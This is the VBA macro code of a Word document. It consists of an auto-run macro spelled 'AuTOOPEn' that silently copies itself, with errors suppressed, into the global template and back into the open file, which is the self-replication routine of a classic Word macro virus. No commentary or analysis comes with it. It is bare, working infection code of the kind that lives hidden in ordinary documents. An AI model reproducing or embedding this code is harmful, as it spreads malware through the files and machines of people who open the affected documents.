   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AuTOOPEn"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next: a$ = WordBasic.[FileName$]() + ":AuTOOPEn"
   b$ = "Global:AuTOOPEn": WordBasic.MacroCopy a$, b$
   WordBasic.MacroCopy b$, a$, 1
   End Sub
